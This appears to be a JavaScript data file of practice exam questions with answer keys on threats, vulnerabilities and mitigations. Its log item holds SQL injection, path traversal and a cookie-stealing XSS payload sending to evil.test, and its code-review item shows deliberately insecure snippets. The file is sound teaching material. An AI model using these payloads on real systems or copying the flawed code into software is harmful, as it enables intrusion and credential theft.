// Domain 2.0 — Threats, Vulnerabilities & Mitigations
PBQ.add([
{
  id: "weblog", domain: 2, time: 4, type: "grid",
  title: "Analyze the web server log",
  scenario: `<p>A SOC analyst pulls the following from the public web server's access log after an alert.</p>`,
  log: `[1] 203.0.113.45  "GET /products.php?id=1' OR '1'='1 HTTP/1.1" 200 5120
[2] 203.0.113.45  "GET /products.php?id=1 UNION SELECT username,password FROM users-- HTTP/1.1" 200 18342
[3] 198.51.100.7  "GET /index.html HTTP/1.1" 200 2210
[4] 198.51.100.22 "GET /download?file=../../../../etc/passwd HTTP/1.1" 403 312
[5] 198.51.100.22 "GET /search?q=<script>new Image().src='http://evil.test/?c='+document.cookie</script> HTTP/1.1" 200 4410`,
  task: "Answer each item.",
  cols: ["Answer"],
  opts: [["SQL injection","Cross-site scripting (XSS)","Directory traversal","CSRF","Buffer overflow","No attack (benign)","203.0.113.45","198.51.100.7","198.51.100.22","Parameterized queries / input validation","Disable directory listing","Increase log retention"]],
  rows: [
    { l: "Attack in lines 1–2", a: ["SQL injection"], w: "' OR '1'='1 and UNION SELECT are classic SQLi payloads." },
    { l: "Attack in line 4", a: ["Directory traversal"], w: "../ sequences try to escape the web root. The 403 shows it was blocked." },
    { l: "Attack in line 5", a: ["Cross-site scripting (XSS)"], w: "A <script> tag injected into a parameter that steals cookies = reflected XSS." },
    { l: "Line 3", a: ["No attack (benign)"], w: "A normal page request." },
    { l: "Highest-priority IP to block", a: ["203.0.113.45"], w: "Line 2 returned 200 with a large response (18 KB) — credentials were likely dumped. That attack succeeded; the traversal was already blocked." },
    { l: "Best fix for lines 1–2", a: ["Parameterized queries / input validation"], w: "Prepared statements stop SQL injection at the source code level." }
  ],
  explain: "Read status codes and response sizes. 200 + large size on an attack line = it probably worked. 403/404 = blocked or failed."
},
{
  id: "authlog", domain: 2, time: 3, type: "grid",
  title: "Identify the authentication attack",
  scenario: `<p>Three separate log excerpts from the VPN and identity provider are shown below.</p>`,
  log: `--- Excerpt A ---
02:11:01 vpn01 FAIL user=jsmith  src=45.33.10.2
02:11:02 vpn01 FAIL user=jsmith  src=45.33.10.2
02:11:02 vpn01 FAIL user=jsmith  src=45.33.10.2
   ... 2,418 more failures for user=jsmith in 6 minutes ...
02:17:12 vpn01 LOCKOUT user=jsmith

--- Excerpt B ---
03:00:01 idp FAIL user=aklein  pw_hash=9f2c.. src=91.200.4.8
03:00:04 idp FAIL user=mpatel  pw_hash=9f2c.. src=91.200.4.8
03:00:07 idp FAIL user=rlee    pw_hash=9f2c.. src=91.200.4.8
03:00:10 idp OK   user=tnguyen pw_hash=9f2c.. src=91.200.4.8

--- Excerpt C ---
08:02:15 idp OK user=dwalsh geo=Portland,US   device=CORP-LT-044
08:14:40 idp OK user=dwalsh geo=Lagos,NG      device=unknown`,
  task: "Match each excerpt to the attack or indicator.",
  cols: ["Attack / indicator"],
  opts: [["Brute force","Password spraying","Impossible travel","Pass-the-hash","Replay attack","Privilege escalation"]],
  rowOpts: { 3: ["MFA","Account lockout threshold","Longer password history","Geofencing"] },
  rows: [
    { l: "Excerpt A", a: ["Brute force"], w: "Thousands of attempts against ONE account, ending in lockout." },
    { l: "Excerpt B", a: ["Password spraying"], w: "The SAME password tried once against MANY accounts — this avoids lockouts." },
    { l: "Excerpt C", a: ["Impossible travel"], w: "Two successful logins from places 12 minutes apart that no one could travel between." },
    { l: "Best control against Excerpt B", a: ["MFA"], w: "MFA stops a correct guessed password from being enough. Lockout policies don't help much against spraying." }
  ],
  explain: "One user with many passwords = brute force. Many users with one password = spraying. Remember that indicator pair."
},
{
  id: "mitigate", domain: 2, time: 4, type: "grid",
  title: "Match the attack to the mitigation",
  scenario: `<p>Each scenario below happened at a different organization. Select the control that would have <b>best</b> prevented it. Each control is used only once.</p>`,
  task: "Choose the best mitigation.",
  cols: ["Mitigation"],
  opts: [["Port security / 802.1X","DNSSEC","Full disk encryption","Application allow list","Multifactor authentication","Patch management","Account lockout policy","Disable SSID broadcast","Code signing"]],
  rows: [
    { l: "A visitor plugs a rogue device into a conference room wall jack", a: ["Port security / 802.1X"], w: "NAC/802.1X requires authentication before a switch port passes traffic." },
    { l: "Users are redirected to a fake banking site through a poisoned DNS cache", a: ["DNSSEC"], w: "DNSSEC signs DNS records, so forged responses fail validation." },
    { l: "A laptop is stolen from a car, and its data is read from the drive", a: ["Full disk encryption"], w: "FDE protects data at rest on lost or stolen devices." },
    { l: "Ransomware runs an unknown executable from the Downloads folder", a: ["Application allow list"], w: "Only approved applications can run. An unknown binary is blocked by default." },
    { l: "Leaked passwords from another site are used to log in (credential stuffing)", a: ["Multifactor authentication"], w: "A reused password alone is no longer enough." },
    { l: "A known CVE with a vendor fix available is exploited on a server", a: ["Patch management"], w: "A fix existed. Patching closes the known vulnerability." },
    { l: "An attacker keeps guessing passwords against one admin account", a: ["Account lockout policy"], w: "Lockout thresholds stop single-account brute force." },
    { l: "A tampered software update is installed by the client", a: ["Code signing"], w: "A signature check fails if the code was changed after signing." }
  ],
  explain: "'Disable SSID broadcast' is a classic distractor. It's security through obscurity and never the BEST answer."
},
{
  id: "malware-id", domain: 2, time: 4, type: "grid",
  title: "Identify the malware",
  scenario: `<p>The help desk escalated several tickets this week. Based on the indicators described, identify the type of malware in each case.</p>`,
  task: "Select the malware type for each ticket.",
  cols: ["Malware type"],
  opts: [["Ransomware","Worm","Trojan","Rootkit","Logic bomb","Fileless malware","Keylogger","Spyware","Virus"]],
  rows: [
    { l: "Files on a share are renamed *.locked, and README_RESTORE.txt demands Bitcoin", a: ["Ransomware"], w: "Encrypts data and demands payment for the key." },
    { l: "Malware spreads to every unpatched host on the subnet over SMB with no user action", a: ["Worm"], w: "Worms self-propagate across the network. A virus needs a host file and a user action." },
    { l: "A free 'PDF converter' a user installed quietly opens a remote backdoor", a: ["Trojan"], w: "Pretends to be legitimate software while carrying a malicious payload (often a RAT)." },
    { l: "Processes and files are hidden from Task Manager and AV. Kernel drivers were modified.", a: ["Rootkit"], w: "Rootkits hide at the kernel or firmware level. Usually you have to reimage." },
    { l: "Code a fired developer left deletes the payroll DB when his account is disabled", a: ["Logic bomb"], w: "Triggered by a condition or event, not by spreading." },
    { l: "A Word macro launches encoded PowerShell that runs only in memory. Nothing is written to disk.", a: ["Fileless malware"], w: "Lives in memory and abuses built-in tools (living off the land), so it evades file-based AV." },
    { l: "Every keystroke on the reception PC is sent to an external IP", a: ["Keylogger"], w: "Captures input to steal credentials." },
    { l: "A macro in a document infects other documents when they're opened and shared", a: ["Virus"], w: "Attaches to host files and needs a user to execute or share them." }
  ],
  explain: "Worm = spreads by itself. Virus = needs a host file and a user. Trojan = disguised as something legitimate. Logic bomb = waits for a trigger."
},
{
  id: "social-eng", domain: 2, time: 4, type: "grid",
  title: "Identify the social engineering technique",
  scenario: `<p>Your security awareness team is building training scenarios from real incidents. Identify the technique used in each.</p>`,
  task: "Match each incident to the technique.",
  cols: ["Technique"],
  opts: [["Phishing","Spear phishing","Whaling","Vishing","Smishing","Business email compromise","Pretexting","Watering hole","Typosquatting","Tailgating"]],
  rows: [
    { l: "A fake subpoena email is sent only to the CEO and General Counsel", a: ["Whaling"], w: "Phishing aimed at senior executives." },
    { l: "An email to three named accountants mentions their real Q4 audit project", a: ["Spear phishing"], w: "Targeted at specific people, using details about them." },
    { l: "A caller claiming to be the IT help desk asks for the user's MFA code", a: ["Vishing"], w: "Voice phishing." },
    { l: "A text message says a package is held and links to a 'fee payment' page", a: ["Smishing"], w: "SMS phishing." },
    { l: "A real vendor's compromised mailbox sends 'updated bank details' for upcoming invoices", a: ["Business email compromise"], w: "BEC uses a legitimate (compromised or spoofed) business account to redirect payments." },
    { l: "A person in a hi-vis vest says he's from the fire marshal and needs to inspect the server room", a: ["Pretexting"], w: "A made-up scenario (the pretext) is used to justify the request." },
    { l: "An industry association's website that your engineers visit is compromised to deliver malware", a: ["Watering hole"], w: "The attacker compromises a site the targets already trust and visit." },
    { l: "Users are lured to micros0ft-login.com", a: ["Typosquatting"], w: "A domain registered to look like the real one." },
    { l: "Someone follows an employee through a badge-controlled door without badging", a: ["Tailgating"], w: "Physical access without authorization. Access control vestibules (mantraps) prevent it." }
  ],
  explain: "Whaling = executives. Spear phishing = specific people. Vishing = voice. Smishing = SMS. BEC = a real business account used to move money."
},
{
  id: "appsec-review", domain: 2, time: 4, type: "grid",
  title: "Code review findings",
  scenario: `<p>You are reviewing snippets flagged by a static analysis (SAST) tool before a release.</p>`,
  log: `(A)  char buf[64];  strcpy(buf, request.user_input);

(B)  db_password = "Adm1n!2024"   # TODO move to config

(C)  if (access(path, W_OK) == 0) {   /* ...200 ms of other work... */
         fd = open(path, O_WRONLY); }

(D)  q = "SELECT * FROM users WHERE name='" + name + "'"

(E)  catch (Exception e) { return response(500, e.stackTrace + db.versionString) }

(F)  stored = md5(password)`,
  task: "Identify the vulnerability in each snippet, then choose the best fix for (D).",
  cols: ["Finding"],
  opts: [["Buffer overflow","Hard-coded credentials","Race condition (TOCTOU)","SQL injection","Improper error handling","Weak hashing algorithm","Cross-site scripting","Memory leak"]],
  rowOpts: { 6: ["Use prepared statements","Encode output as HTML","Add a WAF only","Hash the input"] },
  rows: [
    { l: "Snippet A", a: ["Buffer overflow"], w: "strcpy has no bounds check. Input longer than 64 bytes overwrites adjacent memory." },
    { l: "Snippet B", a: ["Hard-coded credentials"], w: "Secrets in source end up in repositories. Use a secrets vault." },
    { l: "Snippet C", a: ["Race condition (TOCTOU)"], w: "Time-of-check vs. time-of-use. The file can be swapped between the check and the open." },
    { l: "Snippet D", a: ["SQL injection"], w: "User input is concatenated directly into a query." },
    { l: "Snippet E", a: ["Improper error handling"], w: "Stack traces and version info give attackers reconnaissance data." },
    { l: "Snippet F", a: ["Weak hashing algorithm"], w: "MD5 is fast and broken. Use bcrypt, scrypt, or Argon2 with a salt." },
    { l: "Best fix for Snippet D", a: ["Use prepared statements"], w: "Parameterized queries separate code from data. A WAF alone is a compensating layer, not the fix." }
  ],
  explain: "On the exam, 'the BEST fix' is almost always the code-level fix (input validation or parameterized queries), not a network control."
}
]);
